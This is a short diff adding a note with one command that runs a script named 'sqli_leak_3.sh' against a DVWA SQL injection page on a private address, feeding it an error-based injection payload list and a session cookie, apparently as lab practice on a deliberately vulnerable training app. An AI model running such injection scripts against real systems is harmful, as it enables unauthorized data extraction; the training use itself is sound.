@@ -1,0 +1,4 @@
+Running scripts:
+
+./sqli_leak_3.sh http://10.147.38.44/DVWA/vulnerabilities/sqli/ Generic_ErrorBased_urlencoded.txt "id=X&Submit=Submit" get corrected_all_encoded.txt 4485 "PHPSESSID=a2re1ir6136hrkm1k0f3qb224t;security=low"
+
